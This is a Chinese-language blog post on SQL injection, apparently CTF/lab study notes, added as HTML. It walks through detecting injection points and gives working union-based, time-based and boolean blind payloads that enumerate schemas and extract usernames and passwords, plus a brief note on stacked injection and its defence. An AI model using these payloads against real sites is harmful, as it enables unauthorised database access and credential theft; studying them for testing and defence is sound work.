@@ -1,0 +1,1297 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SQL注入, Qiu-lan&#39;s blog">
+    <meta name="description" content="一、判断注入类型按照注入点类型分类数字型注入​        SQL中的语句格式：
+1select * from users where id =x
+
+
+
+    判断方法：使用 1 and 1=1  ，1 and 1=2 来判断
+
+   ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SQL注入 | Qiu-lan&#39;s blog</title>
+    <link rel="icon" type="image/jpeg" href="/qiu%20logo.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/blog%20logo%20a.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Qiu-lan&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/blog%20logo%20a.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Qiu-lan&#39;s blog</div>
+        <div class="logo-desc">
+            
+            昭昭如愿，岁岁安澜
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SQL注入</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2025-01-29
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="一、判断注入类型"><a href="#一、判断注入类型" class="headerlink" title="一、判断注入类型"></a>一、判断注入类型</h2><h3 id="按照注入点类型分类"><a href="#按照注入点类型分类" class="headerlink" title="按照注入点类型分类"></a>按照注入点类型分类</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>​        SQL中的语句格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =x</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>    判断方法：使用 1 and 1=1  ，1 and 1=2 来判断
+
+    当输入：and 1=1 时页面显示正常
+
+                   select * from users where id =x and 1=1
+
+        输入：and 1=2 时页面显示异常
+
+                   select * from users where id =x and 1=2
+
+       说明是数字型注入
+</code></pre>
+<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>​        SQL中的语句格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =&#x27;x&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>    判断方法：使用 1&#39; and &#39;1&#39;=&#39;1  ，1&#39; and &#39;1&#39;=&#39;2 来判断
+
+    当输入：1’ and ‘1’=&#39;1 时页面显示正常
+
+                   select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;1&#39;
+
+       输入：1’ and ‘1’=&#39;2 时页面显示异常
+
+                  select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;2&#39;
+
+      说明是字符型注入
+</code></pre>
+<h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>​        基于搜索框的注入</p>
+<p>​    SQL中的语句格式：select * from database.table where users like ‘%要查询的关键字%’</p>
+<p>   判断方法：</p>
+<p>​     某个商品名称%’ and 1&#x3D;1 and ‘%’&#x3D;’  （这个语句的功能就相当于普通SQL注入的 and 1&#x3D;1）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;%&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​    页面显示正常</p>
+<p>​     某个商品名称%’ and 1&#x3D;2 and ‘%’&#x3D;’  （这个语句的功能就相当于普通SQL注入的 and 1&#x3D;2）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;%&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​    页面显示异常</p>
+<p>​    根据上面的返回情况来判断是否存在搜索型注入</p>
+<h2 id="二、联合注入"><a href="#二、联合注入" class="headerlink" title="二、联合注入"></a>二、联合注入</h2><h6 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h6><p>​        语句：1’ or 1 &#x3D; 1#    (这条万能语句常用于登录框之类的注入)</p>
+<p>​    作用：是爆出表中的所有字段</p>
+<p>​    举例：验证用户名和密码的语句</p>
+<p>​    【在地址栏中的注释符可以用：–+】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​    当存在SQL注入，我们在密码出输入 1’ or 1 &#x3D; 1# 后，整条语句变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;1&#x27; or 1 = 1#&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​    # 是注释符号，后面的内容被注释掉，or 是或，作用两边有一边为真，结果就为真，因为右边的 1&#x3D;1 为真，所以上述语句等价于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27; or 1 = 1</span><br></pre></td></tr></table></figure>
+
+<p>​    即使用户名不存在也没关系，1&#x3D;1 为 true，等价于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure>
+
+<p>​    所以该语句的作用是爆破出所有字段</p>
+<h6 id="查询字段数"><a href="#查询字段数" class="headerlink" title="查询字段数"></a>查询字段数</h6><p>​    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：1&#x27;  order by 数值#</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h6><p>order by 判断字段数的目的就是为这一步做准备，如果只有 2 个字段，那union select 1,2# 才是正确的，写成 union select 1,2,3# 就错了，字段数只有两个没有三个</p>
+<pre><code>    语句：-1’ union select 1,2,3#
+</code></pre>
+<h6 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h6><p>​        关键：database()</p>
+<pre><code>    根据回显位，在回显位输入所要内容对应的关键字。（例如回显位是 2）
+
+    语句：-1&#39; union select 1,database(),3#
+</code></pre>
+<h6 id="爆破表格名"><a href="#爆破表格名" class="headerlink" title="爆破表格名"></a>爆破表格名</h6><p>​        </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键：group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>    和爆破数据库名一样的思路
+
+    语句：-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3#
+</code></pre>
+<p>【注意：如果 information_schema 被过滤了，可以使用 sys】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&amp;&amp;substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),1,1)=&#x27;f&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="爆破表格字段"><a href="#爆破表格字段" class="headerlink" title="爆破表格字段"></a>爆破表格字段</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键：group_concat(column_name) from information_schema.columns where table_name=&#x27;表格名&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>    语句：-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;表格名&#39;,3#
+</code></pre>
+<h6 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h6><h6 id=""><a href="#" class="headerlink" title=""></a></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键：group_concat(id,username,password) from geekuser</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>    语句：-1&#39; union select 1,group_concat(id,username,password) from geekuser,3#
+</code></pre>
+<p>(以上所用到的语句都属于联合注入，union select 开头的语句属于联合注入，这种注入有个前提条件，页面必须有回显位，如果页面没有回显位那就要考虑盲注，可直接在目录找到盲注相关内容)</p>
+<h2 id="四、盲注"><a href="#四、盲注" class="headerlink" title="四、盲注"></a>四、盲注</h2><p>概念：在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试（说白了就是猜测内容），这个过程成为盲注</p>
+<p>注意：盲注是不能通过直接显示的途径来获取数据库信息。在盲注中，需要根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同）</p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul>
+<li><strong>使用场景：</strong>无论我们输入的语句是否合法，页面的显示信息是<strong>固定</strong>的，即不会出现查询的信息，也不会出现报错信息。</li>
+</ul>
+<p>（可以尝试基于<strong>时间盲注</strong>来测试，根据<strong>页面响应的时间</strong>，来判断输入的信息是否正确）</p>
+<ul>
+<li><strong>本质：</strong>利用插入的sql语句执行造成时间延迟</li>
+</ul>
+<h5 id="第一步：判断参数构造"><a href="#第一步：判断参数构造" class="headerlink" title="第一步：判断参数构造"></a>第一步：判断参数构造</h5><blockquote>
+<p>?id&#x3D;1’ and if(1&#x3D;1,sleep(6),1)–+</p>
+</blockquote>
+<p>如果 1&#x3D;1 成立，延迟 6 秒才访问成功</p>
+<p>这里会一直加载中，知道达到 6 s，如果 条件不成立（比如：1 &#x3D; 2），那就会直接访问成功，不会转（当然了，实战时要确保网络正常，不然可能会出现误判）</p>
+<h5 id="第二步：判断数据名长度"><a href="#第二步：判断数据名长度" class="headerlink" title="第二步：判断数据名长度"></a>第二步：判断数据名长度</h5><blockquote>
+<p>?id&#x3D;1’and if(length((select database()))&#x3D;8,sleep(6),1)–+</p>
+</blockquote>
+<p>解释：如果数据库长度为 8 ，则条件成立，延迟 6 s，否则不延迟，这个数字需要大家自己慢慢去试</p>
+<h5 id="第三步：爆破数据库名"><a href="#第三步：爆破数据库名" class="headerlink" title="第三步：爆破数据库名"></a>第三步：爆破数据库名</h5><p>方法一：</p>
+<blockquote>
+<p>?id&#x3D;1’ and if(ascii(substr((select <strong>database()</strong>),1,1))&#x3D;115,sleep(6),1)–+</p>
+</blockquote>
+<p>方法二：</p>
+<blockquote>
+<p>?id&#x3D;1’ and if(left(<strong>database()</strong>,1)&#x3D;’s’,sleep(6),1)–+</p>
+</blockquote>
+<h5 id="第四步：判断数据库表名长度"><a href="#第四步：判断数据库表名长度" class="headerlink" title="第四步：判断数据库表名长度"></a>第四步：判断数据库表名长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+
+<h5 id="第五步：爆破数据库表名"><a href="#第五步：爆破数据库表名" class="headerlink" title="第五步：爆破数据库表名"></a>第五步：爆破数据库表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101,sleep(6),1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>刚开始判断的时候可以 &gt;97、&gt;99这样去快速逼近正确值，最后再用等号去确定</p>
+<h5 id="第六步：爆破所有字段名长度"><a href="#第六步：爆破所有字段名长度" class="headerlink" title="第六步：爆破所有字段名长度"></a>第六步：爆破所有字段名长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>这里的 users 是通过前面的爆破数据库表名爆破出来的，那一步没过，是到不了这一步的，只有确定了账号密码等信息在哪个表，哪个字段才行</p>
+<h5 id="第七步：爆破字段名"><a href="#第七步：爆破字段名" class="headerlink" title="第七步：爆破字段名"></a>第七步：爆破字段名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+
+<h5 id="第八步：判断字段内容长度"><a href="#第八步：判断字段内容长度" class="headerlink" title="第八步：判断字段内容长度"></a>第八步：判断字段内容长度</h5><p>假设得出存在 username、password等字段，那账号密码等数据大概率保存在这里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+
+<h5 id="第九步：爆破字段内容"><a href="#第九步：爆破字段内容" class="headerlink" title="第九步：爆破字段内容"></a>第九步：爆破字段内容</h5><p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))=68,sleep(6),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>十进制 68 对应的 ASCII 字符是 D</p>
+<p>方法二：</p>
+<p>个人感觉方法二更快，方法一还得去 ASCII 表对着找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(left((select group_concat(username,password) from users),1)=&#x27;D&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><p><strong>使用场景：</strong>适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false</p>
+<p>布尔盲注主要用到 <strong>length()<strong>、</strong>ascii()<strong>、</strong>substr()</strong> 这三个函数</p>
+<p><strong>步骤：</strong></p>
+<blockquote>
+<p>1、先判断长度</p>
+<p>2、在判断字符</p>
+</blockquote>
+<h5 id="第一步：判断数据库名长度"><a href="#第一步：判断数据库名长度" class="headerlink" title="第一步：判断数据库名长度"></a><strong>第一步：</strong>判断数据库名长度</h5><p>判断数据库名长度：</p>
+<blockquote>
+<p>?id&#x3D;1’ and length((select database()))&#x3D;8–+</p>
+</blockquote>
+<p>注意：1后面的 ‘ 是需要判断的，也有可能是 “ ，也可能是 ‘)、”) 这是语句里面的闭合符合，也可以是 &gt;8、&lt;8 之类的</p>
+<p>若是在输入框中，and 要改成 or</p>
+<h5 id="第二步：爆破数据库名"><a href="#第二步：爆破数据库名" class="headerlink" title="第二步：爆破数据库名"></a>第二步：爆破数据库名</h5><p>一个一个字符对着 ASCII 匹配，不难但是很耗时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))=115--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(&quot;788888&quot;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注因为要判断每一个字符，所以长度为一，后面就改变读取位置就可以了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>另一种方法：left()**</p>
+<blockquote>
+<p>?id&#x3D;1’ and left(database(),1)&#x3D;’s’ –+  （判断第一个字符是不是 s）</p>
+</blockquote>
+<h5 id="第三步：判断数据库表长度"><a href="#第三步：判断数据库表长度" class="headerlink" title="第三步：判断数据库表长度"></a>第三步：判断数据库表长度</h5><p>判断数据库表长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+</span><br></pre></td></tr></table></figure>
+
+<p>上面那条语句的意思是判断所有数据库表名的长度</p>
+<h5 id="第四步：爆破表名"><a href="#第四步：爆破表名" class="headerlink" title="第四步：爆破表名"></a>第四步：爆破表名</h5><p>一个一个字符爆破表名</p>
+<p>方法一：匹配字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+</span><br></pre></td></tr></table></figure>
+
+<p>和上面一样，一个一个试，或者用脚本</p>
+<p>方法二：直接匹配名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 2,1)=&#x27;uagents&#x27;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="第五步：判断所有字段名长度"><a href="#第五步：判断所有字段名长度" class="headerlink" title="第五步：判断所有字段名长度"></a>第五步：判断所有字段名长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))=20--+</span><br></pre></td></tr></table></figure>
+
+<h5 id="第六步：爆破字段名"><a href="#第六步：爆破字段名" class="headerlink" title="第六步：爆破字段名"></a>第六步：爆破字段名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99--+</span><br></pre></td></tr></table></figure>
+
+<p>同样也可以直接匹配名字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1)=&#x27;username&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>最后匹配发现有：username、password （这两个是比较关键的）</p>
+<h5 id="第七步：判断所有字段内容长度"><a href="#第七步：判断所有字段内容长度" class="headerlink" title="第七步：判断所有字段内容长度"></a>第七步：判断所有字段内容长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span><br></pre></td></tr></table></figure>
+
+<h5 id="第八步：爆破字段值（匹配账号密码）"><a href="#第八步：爆破字段值（匹配账号密码）" class="headerlink" title="第八步：爆破字段值（匹配账号密码）"></a>第八步：爆破字段值（匹配账号密码）</h5><p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select username from users where id=1)=&#x27;dumb&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、堆叠注入"><a href="#五、堆叠注入" class="headerlink" title="五、堆叠注入"></a>五、堆叠注入</h2><p>概念：堆叠注入，也称堆查询注入，顾名思义就是多条语句同时执行。在SQL中，分号 ; 用来表示一条 sql 语句的结束。在 ; 结束一个sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入，攻击就是利用此特点，在第二条语句中构造payload。</p>
+<p>原理：很简单，mysql_multi_query() 支持多条sql语句同时执行</p>
+<p>防范方法：使用 mysqli_ query() 函数，其只能执行一条语句，分号后面的内容将不会被执行；过滤特殊符</p>
+<p>号 “ ; ”。</p>
+<p>堆叠注入优点：联合查询 union 也可拼接语句（有局限性），但是堆叠注入能注入任意语句</p>
